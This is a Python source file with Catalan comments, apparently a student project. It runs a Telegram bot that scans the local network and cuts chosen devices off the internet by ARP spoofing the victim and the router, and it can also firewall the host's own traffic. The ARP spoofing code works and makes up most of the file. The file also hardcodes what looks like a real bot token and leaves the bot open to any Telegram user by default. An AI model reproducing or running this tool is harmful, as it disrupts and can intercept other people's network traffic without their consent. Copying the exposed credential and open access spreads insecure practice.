import sys
import subprocess
import os
import threading

# Afegim la ruta on hi ha instal·lat el telebot del teu usuari perquè "sudo" el pugui trobar
sys.path.append('/home/alumnat/.local/lib/python3.12/site-packages')
import telebot

# ─────────────────────────────────────────────────────────────────
# CONFIGURACIÓ
# ─────────────────────────────────────────────────────────────────

# Token del bot de Telegram (obtingut de @BotFather)
BOT_TOKEN = '8189384287:AAGClqRbVNIXxAdzycpBynJHYTMG4TyAV-w'

# El teu ID d'usuari de Telegram perquè només tu puguis usar el bot
# Posa aquí el teu ID (ex: ADMIN_ID = 123456789) o deixa None per a accés obert (PERILLÓS)
ADMIN_ID = None

bot = telebot.TeleBot(BOT_TOKEN)

# ─────────────────────────────────────────────────────────────────
# GESTIÓ DE DISPOSITIUS KICKEJATS
# ─────────────────────────────────────────────────────────────────

# Diccionari: IP -> thread d'ARP spoofing en curs
kicked_targets = {}  # { 'ip': {'thread': Thread, 'stop_event': Event, 'mac': str} }


def get_gateway():
    """Obté la IP del gateway (router) per defecte."""
    result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True)
    parts = result.stdout.split()
    if 'via' in parts:
        return parts[parts.index('via') + 1]
    return None


def get_mac(ip):
    """Obté la MAC d'una IP fent un ARP request amb scapy."""
    from scapy.all import ARP, Ether, srp
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result, _ = srp(packet, timeout=3, verbose=0)
    if result:
        return result[0][1].hwsrc
    return None


def get_my_mac():
    """Obté la MAC de la interfície de xarxa activa."""
    result = subprocess.run(['cat', '/sys/class/net/$(ip route | grep default | awk \'{print $5}\')/address'],
                            capture_output=True, text=True, shell=False)
    # Alternativa més robusta:
    import socket
    import fcntl
    import struct
    iface = subprocess.run(
        "ip route | grep default | awk '{print $5}'",
        shell=True, capture_output=True, text=True
    ).stdout.strip()
    if not iface:
        return None
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15].encode()))
    return ':'.join('%02x' % b for b in info[18:24])


def _arp_spoof_loop(target_ip, gateway_ip, target_mac, gateway_mac, stop_event):
    """Bucle que envia paquets ARP falsos per enganyar la víctima i el gateway."""
    from scapy.all import ARP, send
    import time
    
    # Paquet que diu a la víctima: "Jo sóc el gateway"
    pkt_to_victim = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    # Paquet que diu al gateway: "Jo sóc la víctima"
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    while not stop_event.is_set():
        send(pkt_to_victim, verbose=0)
        send(pkt_to_gateway, verbose=0)
        time.sleep(1.5)


def _arp_restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """Restaura les taules ARP reals quan aturem el spoofing."""
    from scapy.all import ARP, send
    # Envia ARP legítim per restaurar les taules
    pkt_to_victim = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    send(pkt_to_victim, count=5, verbose=0)
    send(pkt_to_gateway, count=5, verbose=0)


def kick_device(target_ip):
    """
    Comença l'ARP spoofing a target_ip per tallar-li l'accés a internet.
    Retorna (True, missatge) si OK, (False, error) si no.
    """
    if target_ip in kicked_targets:
        return False, f"El dispositiu {target_ip} ja estava kickejat."

    gateway_ip = get_gateway()
    if not gateway_ip:
        return False, "No s'ha pogut obtenir la IP del gateway."

    target_mac = get_mac(target_ip)
    if not target_mac:
        return False, f"No s'ha pogut obtenir la MAC de {target_ip}. Comprova que el dispositiu és a la xarxa."

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        return False, "No s'ha pogut obtenir la MAC del gateway."

    stop_event = threading.Event()
    t = threading.Thread(
        target=_arp_spoof_loop,
        args=(target_ip, gateway_ip, target_mac, gateway_mac, stop_event),
        daemon=True
    )
    t.start()

    kicked_targets[target_ip] = {
        'thread': t,
        'stop_event': stop_event,
        'target_mac': target_mac,
        'gateway_ip': gateway_ip,
        'gateway_mac': gateway_mac,
    }
    return True, f"✅ Dispositiu {target_ip} (MAC: {target_mac}) kickejat correctament."


def unkick_device(target_ip):
    """
    Atura l'ARP spoofing a target_ip i restaura la connectivitat del dispositiu.
    Retorna (True, missatge) si OK, (False, error) si no.
    """
    if target_ip not in kicked_targets:
        return False, f"El dispositiu {target_ip} no estava kickejat."

    info = kicked_targets.pop(target_ip)
    info['stop_event'].set()
    info['thread'].join(timeout=5)

    # Restaurar les taules ARP de la víctima i el gateway
    _arp_restore(target_ip, info['gateway_ip'], info['target_mac'], info['gateway_mac'])

    return True, f"✅ Dispositiu {target_ip} reconnectat correctament."


def llista_dispositius_xarxa():
    """Escaneja la xarxa local i retorna una llista de dispositius actius (IP, MAC)."""
    from scapy.all import ARP, Ether, srp
    gateway_ip = get_gateway()
    if not gateway_ip:
        return None, "No s'ha pogut obtenir el gateway."

    # Detectar la subxarxa a partir del gateway (assumim /24)
    xarxa = '.'.join(gateway_ip.split('.')[:3]) + '.0/24'
    arp = ARP(pdst=xarxa)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result, _ = srp(packet, timeout=3, verbose=0)

    dispositius = []
    for _, recv in result:
        dispositius.append({'ip': recv.psrc, 'mac': recv.hwsrc})

    return dispositius, None


# ─────────────────────────────────────────────────────────────────
# CONTROL DEL PROPI ORDINADOR (codi original)
# ─────────────────────────────────────────────────────────────────

def bloquejar_internet():
    desbloquejar_internet()
    subprocess.run(['iptables', '-N', 'TELEGRAM_LOCK'], check=True)
    subprocess.run(['iptables', '-A', 'TELEGRAM_LOCK', '-o', 'lo', '-j', 'ACCEPT'], check=True)
    subprocess.run(['iptables', '-A', 'TELEGRAM_LOCK', '-p', 'udp', '--dport', '53', '-j', 'ACCEPT'], check=True)
    subprocess.run(['iptables', '-A', 'TELEGRAM_LOCK', '-p', 'tcp', '--dport', '53', '-j', 'ACCEPT'], check=True)
    subnets = [
        '149.154.160.0/20', '91.108.4.0/22',
        '91.108.56.0/22', '91.108.8.0/22', '149.154.164.0/22'
    ]
    for subnet in subnets:
        subprocess.run(['iptables', '-A', 'TELEGRAM_LOCK', '-d', subnet, '-j', 'ACCEPT'], check=True)
    subprocess.run(['iptables', '-A', 'TELEGRAM_LOCK', '-j', 'REJECT'], check=True)
    subprocess.run(['iptables', '-I', 'OUTPUT', '1', '-j', 'TELEGRAM_LOCK'], check=True)


def desbloquejar_internet():
    subprocess.run(['iptables', '-D', 'OUTPUT', '-j', 'TELEGRAM_LOCK'], stderr=subprocess.DEVNULL)
    subprocess.run(['iptables', '-F', 'TELEGRAM_LOCK'], stderr=subprocess.DEVNULL)
    subprocess.run(['iptables', '-X', 'TELEGRAM_LOCK'], stderr=subprocess.DEVNULL)


# ─────────────────────────────────────────────────────────────────
# AUTORITZACIÓ
# ─────────────────────────────────────────────────────────────────

def estic_autoritzat(user_id):
    if ADMIN_ID is None:
        return True
    return str(user_id) == str(ADMIN_ID)


# ─────────────────────────────────────────────────────────────────
# HANDLERS DEL BOT
# ─────────────────────────────────────────────────────────────────

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message,
        "🤖 Bot de control de xarxa\n\n"
        "📡 *Control del teu ordinador:*\n"
        "/desconnectar — Bloqueja tot internet (excepte Telegram)\n"
        "/connectar — Torna a obrir accés a internet\n\n"
        "🔫 *Control d'altres dispositius:*\n"
        "/dispositius — Llista els dispositius a la xarxa\n"
        "/kick <IP> — Talla la connexió d'un dispositiu\n"
        "/unkick <IP> — Restaura la connexió d'un dispositiu\n"
        "/kickejats — Llista els dispositius kickejats ara\n",
        parse_mode='Markdown'
    )


@bot.message_handler(commands=['desconnectar'])
def desconnectar_xarxa(message):
    if not estic_autoritzat(message.from_user.id):
        bot.reply_to(message, "❌ No estàs autoritzat per utilitzar aquesta comanda.")
        return
    bot.reply_to(message, "🔒 Bloquejant accés a internet (excepte Telegram)...")
    try:
        bloquejar_internet()
        bot.reply_to(message, "✅ Internet bloquejat. Usa /connectar per tornar-lo a obrir.")
    except Exception as e:
        desbloquejar_internet()
        bot.reply_to(message, f"❌ Error al desconnectar: {e}")


@bot.message_handler(commands=['connectar'])
def connectar_xarxa(message):
    if not estic_autoritzat(message.from_user.id):
        bot.reply_to(message, "❌ No estàs autoritzat per utilitzar aquesta comanda.")
        return
    bot.reply_to(message, "🔓 Obrint accés a internet...")
    try:
        desbloquejar_internet()
        bot.reply_to(message, "✅ Internet restaurat correctament.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error al connectar: {e}")


@bot.message_handler(commands=['dispositius'])
def llista_dispositius(message):
    if not estic_autoritzat(message.from_user.id):
        bot.reply_to(message, "❌ No estàs autoritzat per utilitzar aquesta comanda.")
        return
    bot.reply_to(message, "🔍 Escanejant la xarxa... (pot trigar uns segons)")
    try:
        dispositius, error = llista_dispositius_xarxa()
        if error:
            bot.reply_to(message, f"❌ Error: {error}")
            return
        if not dispositius:
            bot.reply_to(message, "⚠️ No s'han trobat dispositius a la xarxa.")
            return
        resposta = "📡 *Dispositius a la xarxa:*\n\n"
        for d in dispositius:
            estat = "🔴 kickejat" if d['ip'] in kicked_targets else "🟢 en línia"
            resposta += f"`{d['ip']}` — `{d['mac']}` {estat}\n"
        bot.reply_to(message, resposta, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error en escanejar: {e}")


@bot.message_handler(commands=['kick'])
def kick_handler(message):
    if not estic_autoritzat(message.from_user.id):
        bot.reply_to(message, "❌ No estàs autoritzat per utilitzar aquesta comanda.")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Ús: /kick <IP>\nExemple: /kick 192.168.1.50")
        return
    target_ip = parts[1]
    bot.reply_to(message, f"⏳ Kickejant {target_ip}...")
    try:
        ok, msg = kick_device(target_ip)
        prefix = "✅" if ok else "❌"
        bot.reply_to(message, f"{prefix} {msg}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error inesperat: {e}")


@bot.message_handler(commands=['unkick'])
def unkick_handler(message):
    if not estic_autoritzat(message.from_user.id):
        bot.reply_to(message, "❌ No estàs autoritzat per utilitzar aquesta comanda.")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Ús: /unkick <IP>\nExemple: /unkick 192.168.1.50")
        return
    target_ip = parts[1]
    bot.reply_to(message, f"⏳ Reconnectant {target_ip}...")
    try:
        ok, msg = unkick_device(target_ip)
        prefix = "✅" if ok else "❌"
        bot.reply_to(message, f"{prefix} {msg}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error inesperat: {e}")


@bot.message_handler(commands=['kickejats'])
def kickejats_handler(message):
    if not estic_autoritzat(message.from_user.id):
        bot.reply_to(message, "❌ No estàs autoritzat per utilitzar aquesta comanda.")
        return
    if not kicked_targets:
        bot.reply_to(message, "ℹ️ Cap dispositiu kickejat ara mateix.")
        return
    resposta = "🔴 *Dispositius kickejats:*\n\n"
    for ip, info in kicked_targets.items():
        resposta += f"`{ip}` (MAC: `{info['target_mac']}`)\n"
    bot.reply_to(message, resposta, parse_mode='Markdown')


# ─────────────────────────────────────────────────────────────────
# INICI
# ─────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("ERROR: Has d'executar el bot com a root (sudo python3 bot.py)")
        sys.exit(1)

    # Netejar qualsevol bloqueig previ
    desbloquejar_internet()

    print("Bot iniciat. Comandes disponibles: /kick, /unkick, /dispositius, /kickejats, /desconnectar, /connectar")
    bot.infinity_polling()
